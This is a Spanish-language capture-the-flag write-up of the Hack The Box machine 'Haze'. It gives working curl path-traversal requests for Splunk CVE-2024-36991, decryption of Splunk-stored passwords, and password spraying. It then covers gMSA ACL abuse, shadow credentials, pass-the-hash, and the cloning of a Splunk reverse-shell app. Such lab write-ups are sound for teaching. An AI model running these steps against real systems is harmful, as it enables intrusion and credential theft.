| gHYEzB3W6FKtWtjmPcqDugGs2WU6UID/fFZpsp+3h2QLGN5e+e1OTjoIbexbJ/S6
| iRjTy6GUjsrHtHM+KBjUFvUvHi27Ns47BkNzA1gedvRYrviscPCBkphjo9x0qDdj
| 3EhgaH2L
|_-----END CERTIFICATE-----
|_http-title: splunkd
|_http-server-header: Splunkd
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60456/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
60457/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60461/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60470/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60489/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60498/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60569/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62662/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46282/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 60211/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 26877/udp): CLEAN (Failed to receive data)
|   Check 4 (port 55442/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-05-13T11:37:43
|_  start_date: N/A
|_clock-skew: 8h00m01s
```

Identifico la maquina como un DC Windows Server 2022.

```terminal
/home/kali/Documents/htb/machines/haze:-$ echo '10.10.11.61\thaze.htb\tdc01\tdc01.haze.htb' | sudo tee -a /etc/hosts

/home/kali/Documents/htb/machines/haze:-$ nxc smb haze.htb
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
```

El puerto 8000, 8088 y 8089 alojan el servicio de Splunk. Esta configuración coincide con la [documentación oficial"https://help.splunk.com/en/splunk-enterprise/administer/inherit-a-splunk-deployment/9.0/inherited-deployment-tasks/components-and-their-relationship-with-the-network) sobre componentes y puertos de Splunk.

```terminal
/home/kali/Documents/htb/machines/haze:-$ whatweb haze.htb:8000
http://haze.htb:8000 [303 See Other] Country[RESERVED][ZZ], HTML5, HTTPServer[Splunkd], IP[10.10.11.61], Meta-Refresh-Redirect[http://haze.htb:8000/en-US/], RedirectLocation[http://haze.htb:8000/en-US/], Title[303 See Other], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN]
http://haze.htb:8000/en-US/ [303 See Other] Cookies[session_id_8000], Country[RESERVED][ZZ], HTTPServer[Splunkd], HttpOnly[session_id_8000], IP[10.10.11.61], RedirectLocation[http://haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2F], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN]
http://haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2F [200 OK] Bootstrap, Cookies[cval,splunkweb_uid], Country[RESERVED][ZZ], HTML5, HTTPServer[Splunkd], IP[10.10.11.61], Meta-Author[Splunk Inc.], Script[text/json], probably Splunk, UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge]

/home/kali/Documents/htb/machines/haze:-$ whatweb https://haze.htb:8089/
https://haze.htb:8089/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Splunkd], IP[10.10.11.61], Title[splunkd], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN]
```

---
### Search Victim-Owned Websites

Al acceder al puerto 8000, el navegador redirige automáticamente a `/en-US/account/login?return_to=%2Fen-US%2F`, correspondiente al panel de autenticación de Splunk Enterprise.

![](assets/img/htb-writeup-haze/haze1_1.png)

El puerto 8089 expone la interfaz API REST de Splunk. Al visitarlo directamente, se muestra la cadena "Splunk Atom Feed", lo que confirma que la instancia se encuentra operativa y expuesta externamente.

![](assets/img/htb-writeup-haze/haze1_2.png)

En este caso, `Splunk Enterprise 9.2.1`, desplegada sobre Windows es susceptible a la vulnerabilidad [CVE-2024-36991](https://nvd.nist.gov/vuln/detail/cve-2024-36991), lo que permite a un atacante remoto sin autenticación acceder a archivos arbitrarios del sistema mediante path traversal <a id="path-traversal" href="#cwe-22" class="cwe-ref">(CWE-22)</a> en el endpoint `/modules/messaging/`.

---
## Initial Access

### Exploit Public-Facing Application

El blog [critical-splunk-vulnerability](https://www.sonicwall.com/blog/critical-splunk-vulnerability-cve-2024-36991-patch-now-to-prevent-arbitrary-file-reads) explica detalladamente como aprovecharse de esta vulnerabilidad. Puedo intentar acceder al /etc/passwd para verificar la vulnerabilidad.

Esta falla, descrita en detalle en [critical-splunk-vulnerability](https://www.sonicwall.com/blog/critical-splunk-vulnerability-cve-2024-36991-patch-now-to-prevent-arbitrary-file-reads), permite realizar un path traversal utilizando prefijos tipo `C:../` dentro de la URL. Para verificar la existencia de la falla, intento acceder a un archivo estándar como `/etc/passwd`.

```terminal
/home/kali/Documents/htb/machines/haze:-$ curl --path-as-is 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd'
:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152
```

El contenido recuperado confirma el acceso arbitrario a archivos del sistema, validando así la explotación exitosa de la vulnerabilidad. El siguiente paso apunta a extraer configuraciones internas de Splunk, especialmente archivos sensibles.

El objetivo ahora consiste en revisar archivos de configuración dentro de la ruta, `C:/Program Files/Splunk/etc/system/local/` La documentación de Splunk [config-file-reference](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.1-configuration-file-reference) ofrece un listado completo de archivos `.conf` que pueden contener valores críticos como credenciales, configuraciones de autenticación, o conexiones LDAP.

Uno de los archivos más relevantes es `authentication.conf`, que en esta instancia contiene un binding LDAP con credenciales asociadas al usuario `Paul Taylor`.

```http
GET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files\Splunk/etc/system/local/authentication.conf HTTP/1.1
```

![](assets/img/htb-writeup-haze/haze1_3.png)

El valor `bindDNpassword` aparece en formato cifrado, lo que impide su utilización directa. Sin embargo, Splunk utiliza una clave interna de cifrado simétrico almacenada en el archivo, `C:/Program Files/Splunk/etc/auth/splunk.secret`.  La documentación oficial sobre [deploy-secure-passwords-across-multiple-servers](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.2/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers) aclara que `splunk.secret` funciona como una clave maestra que permite descifrar contraseñas presentes en archivos como `authentication.conf`, `server.conf` y otros.

```http
GET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files\Splunk/etc/auth/splunk.secret HTTP/1.1
```

![](assets/img/htb-writeup-haze/haze1_4.png)

```terminal
/home/kali/Documents/htb/machines/haze:-$ echo 'NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD' > secret.txt
```

---
### Brute Force

Con el archivo server.conf en mano, el siguiente paso consiste en utilizar la herramienta [HurricaneLabs-splunksecrets](https://github.com/HurricaneLabs/splunksecrets) para descifrar el valor de `bindDNpassword`. Esto permite recuperar la contraseña en texto plano asociada a la cuenta de Paul Taylor, exponiendo sus credenciales <a id="insufficiently-protected-credentials" href="#cwe-522" class="cwe-ref">(CWE-522)</a>.

```terminal
(venv)-/home/kali/Documents/htb/machines/haze:-$ splunksecrets splunk-decrypt -S secret.txt 
Ciphertext: $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
Ld@p_Auth_Sp1unk@2k24
```

---
### Account Discovery

El resultado expone la contraseña `Ld@p_Auth_Sp1unk@2k24`, asociada al usuario `Paul Taylor`. Ahora puedo inicia la fase de enumeración de servicios internos del Domain Controller.

```terminal
/home/kali/Documents/htb/machines/haze:-$ nxc smb 10.10.11.61 -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24'
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
```

---

Comienzo con una enumeración para identificar usuarios válidos dentro del dominio `haze.htb`.

```terminal
/home/kali/Documents/htb/machines/haze:-$ nxc smb 10.10.11.61 -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute | grep SidTypeUser
SMB                      10.10.11.61     445    DC01             500: HAZE\Administrator (SidTypeUser)
SMB                      10.10.11.61     445    DC01             501: HAZE\Guest (SidTypeUser)
SMB                      10.10.11.61     445    DC01             502: HAZE\krbtgt (SidTypeUser)
SMB                      10.10.11.61     445    DC01             1000: HAZE\DC01$ (SidTypeUser)
SMB                      10.10.11.61     445    DC01             1103: HAZE\paul.taylor (SidTypeUser)
SMB                      10.10.11.61     445    DC01             1104: HAZE\mark.adams (SidTypeUser)
SMB                      10.10.11.61     445    DC01             1105: HAZE\edward.martin (SidTypeUser)
SMB                      10.10.11.61     445    DC01             1106: HAZE\alexander.green (SidTypeUser)
SMB                      10.10.11.61     445    DC01             1111: HAZE\Haze-IT-Backup$ (SidTypeUser)
```

```terminal
/home/kali/Documents/htb/machines/haze:-$ echo 'paul.taylor\nmark.adams\nedward.martin\nalexander.green\nHaze-IT-Backup$' > users2.txt
```

Realizo un ataque de password spraying utilizando la contraseña ya conocida. El objetivo es verificar si otros usuarios comparten las mismas credenciales. Y confirmo que `mark.adams` también posee acceso con la misma contraseña.

```terminal
/home/kali/Documents/htb/machines/haze:-$ nxc smb 10.10.11.61 -u users2.txt -p 'Ld@p_Auth_Sp1unk@2k24' --continue-on-success
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
SMB         10.10.11.61     445    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
SMB         10.10.11.61     445    DC01             [-] haze.htb\edward.martin:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\alexander.green:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\Haze-IT-Backup$:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
```

---
### Permission Groups Discovery

```terminal
/home/kali/Documents/htb/machines/haze:-$ faketime "$(rdate -n -p $TARGET | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh

/home/kali/Documents/htb/machines/haze:-$ bloodhound-python -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' -ns 10.10.11.61 --zip -c All -d haze.htb -dc dc01.haze.htb
```

Encuentro que `mark.adams` forma parte del grupo `GMSA_MANAGERS`, lo que implica privilegios administrativos sobre cuentas de tipo Group Managed Service Account. Los Group Managed Service Accounts permiten el uso de cuentas administradas por el dominio con contraseñas largas, rotadas automáticamente y recuperables únicamente por usuarios autorizados. La pertenencia a `GMSA_MANAGERS` implica privilegios sobre al menos una cuenta de servicio de este tipo.

![](assets/img/htb-writeup-haze/haze2_1.png)

---
## Lateral Movement

### Remote Services

```terminal
/home/kali/Documents/htb/machines/haze:-$ evil-winrm -i 10.10.11.61 -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24'

*Evil-WinRM* PS C:\Users\mark.adams\Documents> whoami
haze\mark.adams
```

Detecto que la cuenta `Haze-IT-Backup$`, pertenece a la clase de objetos [msDS-GroupManagedServiceAccount](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword#readgmsapassword), lo cual implica que su contraseña es gestionada automáticamente por el controlador de dominio y puede ser recuperada por usuarios autorizados.

```powershell
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Get-ADServiceAccount -Filter * | Select-Object Name, ObjectClass

Name           ObjectClass
----           -----------
Haze-IT-Backup msDS-GroupManagedServiceAccount
```

Al inspeccionar los permisos de recuperación de contraseña, definidos en el atributo `PrincipalsAllowedToRetrieveManagedPassword`. Identifico que únicamente el grupo `Domain Admins` posee autorización para acceder a la contraseña de la cuenta `Haze-IT-Backup$`.

```powershell
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Get-ADServiceAccount -Identity "Haze-IT-Backup$" -Properties PrincipalsAllowedToRetrieveManagedPassword

DistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Enabled                                    : True
Name                                       : Haze-IT-Backup
ObjectClass                                : msDS-GroupManagedServiceAccount
ObjectGUID                                 : 66f8d593-2f0b-4a56-95b4-01b326c7a780
PrincipalsAllowedToRetrieveManagedPassword : {CN=Domain Admins,CN=Users,DC=haze,DC=htb}
SamAccountName                             : Haze-IT-Backup$
SID                                        : S-1-5-21-323145914-28650650-2368316563-1111
UserPrincipalName                          :
```

Corroboro esta configuración utilizando la herramienta [gMSADumper](https://github.com/micahvandeusen/gMSADumper), la cual extrae los blobs de contraseñas `gMSA` accesibles por el usuario autenticado. El resultado confirma que solo los `Domain Admins` están autorizados a leerla.

```terminal
/home/kali/Documents/Tools:-$ git clone https://github.com/micahvandeusen/gMSADumper.git

/home/kali/Documents/htb/machines/haze:-$ python3 /home/kali/Documents/Tools/gMSADumper/gMSADumper.py -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' -l dc01.haze.htb -d haze.htb
Users or groups who can read password for Haze-IT-Backup$:
 > Domain Admins
```

Analizo los permisos ACL para verificar el acceso sobre el atributo `msDS-GroupMSAMembership`. Y encuentro que el grupo `gMSA_Managers`, al cual pertenece `mark.adams`, posee privilegios de escritura sobre ese atributo <a id="incorrect-privilege-assignment" href="#cwe-266" class="cwe-ref">(CWE-266)</a>.

```powershell
*Evil-WinRM* PS C:\Users\mark.adams\Documents> dsacls "CN=HAZE-IT-BACKUP,CN=MANAGED SERVICE ACCOUNTS,DC=HAZE,DC=HTB"
...snip...
Allow HAZE\gMSA_Managers              SPECIAL ACCESS for msDS-GroupMSAMembership
                                      WRITE PROPERTY
...snip...
```

---
### Domain or Tenant Policy Modification

El atributo `msDS-GroupMSAMembership` define qué usuarios o grupos están autorizados a recuperar la contraseña del objeto `gMSA`. Al contar con permisos de escritura sobre este atributo, el usuario `mark.adams` tiene la capacidad directa de agregarse a la lista de entidades permitidas para acceder a la contraseña de la identidad `Haze-IT-Backup$`.

Aprovecho este privilegio para modificar el valor de `PrincipalsAllowedToRetrieveManagedPassword`, estableciendo que `mark.adams` sea un sujeto autorizado.

```powershell
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Set-ADServiceAccount -Identity "Haze-IT-Backup$" -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"

*Evil-WinRM* PS C:\Users\mark.adams\Documents> Get-ADServiceAccount -Identity "Haze-IT-Backup$" -Properties PrincipalsAllowedToRetrieveManagedPassword


DistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Enabled                                    : True
Name                                       : Haze-IT-Backup
ObjectClass                                : msDS-GroupManagedServiceAccount
ObjectGUID                                 : 66f8d593-2f0b-4a56-95b4-01b326c7a780
PrincipalsAllowedToRetrieveManagedPassword : {CN=Mark Adams,CN=Users,DC=haze,DC=htb}
SamAccountName                             : Haze-IT-Backup$
SID                                        : S-1-5-21-323145914-28650650-2368316563-1111
UserPrincipalName                          :
```

Ejecuto nuevamente gMSADumper con las mismas credenciales y obtengo con éxito los hashes de contraseñas AES256 y AES128 asociadas a la cuenta `Haze-IT-Backup$` asi como el NT hash.

```terminal
/home/kali/Documents/htb/machines/haze:-$ python3 /home/kali/Documents/Tools/gMSADumper/gMSADumper.py -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' -l dc01.haze.htb -d haze.htb
Users or groups who can read password for Haze-IT-Backup$:
 > mark.adams
Haze-IT-Backup$:::84d6a733d85d9e03f46eba25b34517a9
Haze-IT-Backup$:aes256-cts-hmac-sha1-96:8c47d46d7f2a5aef9d2ab5fda8c60b6e094ad78b2c55878faa9ff2b7fac740a6
Haze-IT-Backup$:aes128-cts-hmac-sha1-96:7627ff016dd47b73e99596362a068f41
```

---
### Use Alternate Authentication Material

```terminal
nxc smb 10.10.11.61 -u 'Haze-IT-Backup$' -H '84d6a733d85d9e03f46eba25b34517a9'
SMB         10.10.11.61     445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    NONE             [+] \Haze-IT-Backup$:84d6a733d85d9e03f46eba25b34517a9
```

```terminal
/home/kali/Documents/htb/machines/haze:-$ bloodhound-python -u 'Haze-IT-Backup$' --hashes ':84d6a733d85d9e03f46eba25b34517a9' -ns 10.10.11.61 --zip -c All -d haze.htb -dc dc01.haze.htb
```

BloodHound indica que la cuenta `Haze-IT-Backup$` posee el privilegio `WriteOwner` sobre el grupo `Support_Services`. Este privilegio permite modificar el propietario del objeto, lo que habilita la posibilidad de establecer controles totales sobre el mismo.

![](assets/img/htb-writeup-haze/haze2_2.png)

Por otro lado, el grupo `Support_Services` cuenta con los permisos `ForceChangePassword` y `AddKeyCredentialLink` sobre el usuario `edward.martin`. El primero habilita el cambio forzado de contraseña, mientras que el segundo permite anexar claves públicas al atributo `msDS-KeyCredentialLink`, lo cual habilita la ejecución de un [shadow credential attack](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials#shadow-credentials).

![](assets/img/htb-writeup-haze/haze2_3.png)

---
### Account Manipulation

Modifico el propietario del objeto `Support_Services`, asignando como nuevo dueño a `Haze-IT-Backup$`.

```terminal
/home/kali/Documents/htb/machines/haze:-$ bloodyAD --host "10.10.11.61" -d "haze.htb" -u "Haze-IT-Backup$" -p ":84d6a733d85d9e03f46eba25b34517a9" set owner SUPPORT_SERVICES Haze-IT-Backup$
[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on SUPPORT_SERVICES
```

Modifico los permisos de acceso al objeto, otorgando a `Haze-IT-Backup$` control total sobre el grupo.

```terminal
/home/kali/Documents/htb/machines/haze:-$ sudo impacket-dacledit -action write -rights FullControl -principal 'Haze-IT-Backup$' -target-dn 'CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB' -dc-ip 10.10.11.61 "haze.htb/Haze-IT-Backup$" -hashes ':84d6a733d85d9e03f46eba25b34517a9'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250513-170121.bak
[*] DACL modified successfully!
```

Luego, agrego la propia cuenta `Haze-IT-Backup$` como miembro del grupo `Support_Services`.

```terminal
/home/kali/Documents/htb/machines/haze:-$ bloodyAD --host "10.10.11.61" -d "haze.htb" -u "Haze-IT-Backup$" -p ":84d6a733d85d9e03f46eba25b34517a9" add groupMember SUPPORT_SERVICES Haze-IT-Backup$
[+] Haze-IT-Backup$ added to SUPPORT_SERVICES
```

---
### Steal or Forge Authentication Certificates

Al estar dentro del grupo, y dado que `Support_Services` tiene permisos `AddKeyCredentialLink` sobre `edward.martin`, procedo a generar una clave de autenticación válida, que permite modificar el atributo `msDS-KeyCredentialLink` e inyectar un certificado propio.

```terminal
/home/kali/Documents/htb/machines/haze:-$ python /home/kali/Documents/Tools/pywhisker/pywhisker/pywhisker.py -d "haze.htb" -u "Haze-IT-Backup$" -H '84d6a733d85d9e03f46eba25b34517a9' --target edward.martin --action add 
[*] Searching for the target account
[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3698d57c-ced3-8773-6203-1a2a4eb0928b
[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: OUGLI3VQ.pfx
[+] PFX exportiert nach: OUGLI3VQ.pfx
[i] Passwort für PFX: ZHInNheY8VhkcfNgm3V0
[+] Saved PFX (#PKCS12) certificate & key at path: OUGLI3VQ.pfx
[*] Must be used with password: ZHInNheY8VhkcfNgm3V0
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Esto genera un certificado vinculado a la cuenta `edward.martin`, junto con una contraseña temporal necesaria para su uso. Este certificado permite solicitar un TGT válido mediante autenticación PKINIT, lo cual constituye el primer paso del ataque [UnPAC the hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash#unpac-the-hash).

```terminal
/home/kali/Documents/htb/machines/haze:-$ python /home/kali/Documents/Tools/PKINITtools/gettgtpkinit.py -cert-pfx OUGLI3VQ.pfx -pfx-pass ZHInNheY8VhkcfNgm3V0 haze.htb/edward.martin edward.ccache 
2025-05-14 01:13:29,293 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-05-14 01:13:29,392 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-05-13 17:13:49,390 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-05-13 17:13:49,390 minikerberos INFO     4d50462755cad08abb41090973a12e284723cc9f2c7142772e7c72c5d641c935
INFO:minikerberos:4d50462755cad08abb41090973a12e284723cc9f2c7142772e7c72c5d641c935
2025-05-13 17:13:49,392 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Con esta clave y el ticket almacenado en `edward.ccache`, solicito el hash NTLM del usuario.

```terminal
/home/kali/Documents/htb/machines/haze:-$ export KRB5CCNAME=edward.ccache

/home/kali/Documents/htb/machines/haze:-$ python /home/kali/Documents/Tools/PKINITtools/getnthash.py -key 4d50462755cad08abb41090973a12e284723cc9f2c7142772e7c72c5d641c935 haze.htb/edward.martin
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

Esto me permite autenticarme directamente como `edward.martin` mediante [pass the hash](https://www.thehacker.recipes/ad/movement/ntlm/pth).

```terminal
/home/kali/Documents/htb/machines/haze:-$ evil-winrm -i 10.10.11.61 -u 'edward.martin' -H '09e0b3eeb2e7a6b0d419e9ff8f4d91af'

*Evil-WinRM* PS C:\Users\edward.martin\Documents> whoami
haze\edward.martin

*Evil-WinRM* PS C:\Users\edward.martin\Documents> type ../Desktop/user.txt
```

---
### Unsecured Credentials

Durante la sesión remota con la cuenta `edward.martin`, localicé un archivo comprimido que contenía un respaldo del entorno Splunk. El contenido se encontraba ubicado en `C:\Backups\Splunk\` <a id="insecure-storage-of-sensitive-information" href="#cwe-922" class="cwe-ref">(CWE-922)</a>.

```powershell
*Evil-WinRM* PS C:\Users\edward.martin\Documents> download C:\Backups\Splunk\splunk_backup_2024-08-06.zip
```

Descomprimí el archivo y para encontrar contenido útil, empleé una expresión regular que permitiera detectar formatos comunes de hashes.

```terminal
/home/kali/Documents/htb/machines/haze:-$ grep -rP '\$[0-9]\$\S{15,}' Splunk/
Splunk/etc/system/README/user-seed.conf.example:HASHED_PASSWORD = $6$TOs.jXjSRTCsfPsw$2St.t9lH9fpXd9mCEmCizWbb67gMFfBIJU37QF8wsHKSGud1QNMCuUdWkD8IFSgCZr5.W6zkjmNACGhGafQZj1
Splunk/etc/system/README/inputs.conf.example:token = $7$ifQTPTzHD/BA8VgKvVcgO1KQAtr3N1C8S/1uK3nAKIE9dd9e9g==
Splunk/etc/system/README/outputs.conf.example:token=$1$/fRSBT+2APNAyCB7tlcgOyLnAtqAQFC8NI4TGA2wX4JHfN5d9g==
Splunk/etc/passwd::admin:$6$8FRibWS3pDNoVWHU$vTW2NYea7GiZoN0nE6asP6xQsec44MlcK2ZehY5RC4xeTAz4kVVcbCkQ9xBI2c7A8VPmajczPOBjcVgccXbr9/::Administrator:admin:changeme@example.com:::19934
grep: Splunk/var/lib/splunk/_introspection/db/db_1722472316_1722471805_2/1722472316-1722471805-7069930062775889648.tsidx: binary file matches
Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/server.conf:pass4SymmKey = $7$u538ChVu1V7V9pXEWterpsj8mxzvVORn8UdnesMP0CHaarB03fSbow==
Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/server.conf:sslPassword = $7$C4l4wOYleflCKJRL9l/lBJJQEBeO16syuwmsDCwft11h7QPjPH8Bog==
Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf:bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
```

Como sucedió anteriormente, uno de los archivos más relevantes resultó ser `authentication.conf`, el cual contenía credenciales LDAP cifradas para `alexander.green`. Este mismo usuario ya había sido identificado en BloodHound como miembro del grupo `Splunk_Admins`, el cual suele tener privilegios elevados en la consola web de administración de Splunk.

```terminal
sed -n '14p;15p;19p' Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf
bindDN = CN=alexander.green,CN=Users,DC=haze,DC=htb
bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
groupBaseDN = CN=Splunk_Admins,CN=Users,DC=haze,DC=htb
```

En paralelo, dentro del backup también encontré una copia del archivo `splunk.secret`, el cual difiere del extraido anteriormente en [CVE Exploitation 1](#cve-exploitation-1).

```terminal
/home/kali/Documents/htb/machines/haze:-$ cat Splunk/etc/auth/splunk.secret
CgL8i4HvEen3cCYOYZDBkuATi5WQuORBw9g4zp4pv5mpMcMF3sWKtaCWTX8Kc1BK3pb9HR13oJqHpvYLUZ.gIJIuYZCA/YNwbbI4fDkbpGD.8yX/8VPVTG22V5G5rDxO5qNzXSQIz3NBtFE6oPhVLAVOJ0EgCYGjuk.fgspXYUc9F24Q6P/QGB/XP8sLZ2h00FQYRmxaSUTAroHHz8fYIsChsea7GBRaolimfQLD7yWGefscTbuXOMJOrzr/6B
```

De modo que, nuevamente al combinar este archivo `splunk.secret` con el valor cifrado `bindDNpassword`, pude obtener la contraseña en texto plano del usuario `alexander.green`.

```terminal
(venv)-/home/kali/Documents/htb/machines/haze:-$ splunksecrets splunk-decrypt -S Splunk/etc/auth/splunk.secret
Ciphertext: $1$YDz8WfhoCWmf6aTRkA+QqUI=
Sp1unkadmin@2k24
```

La contraseña desencriptada `Sp1unkadmin@2k24` resultó válida para la cuenta `admin`, lo que permite acceder a funciones administrativas a través de la interfaz web de Splunk.

![](assets/img/htb-writeup-haze/haze3_1.png)

---
### Command and Scripting Interpreter

Este nivel de acceso permite explotar la vulnerabilidad [CVE-2023-46214](https://nvd.nist.gov/vuln/detail/cve-2023-46214). Esta falla afecta a versiones de Splunk Enterprise anteriores a `9.0.7` y `9.1.2`, permitiendo ejecutar código arbitrario al procesar archivos maliciosos XSLT <a id="xml-injection" href="#cwe-91" class="cwe-ref">(CWE-91)</a> > <a id="code-injection" href="#cwe-94" class="cwe-ref">(CWE-94)</a>.

![](assets/img/htb-writeup-haze/haze3_2.png)

La explotación se realiza mediante la carga de una aplicación falsa en formato `.spl`, que al ser instalada desencadena la ejecución del payload malicioso. Utilicé como base el repositorio [0xjpuff/reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk), el cual proporciona una estructura de aplicación válida para Splunk con un payload integrado en PowerShell.

```terminal
/home/kali/Documents/htb/machines/haze/exploits:-$ git clone https://github.com/0xjpuff/reverse_shell_splunk.git
```

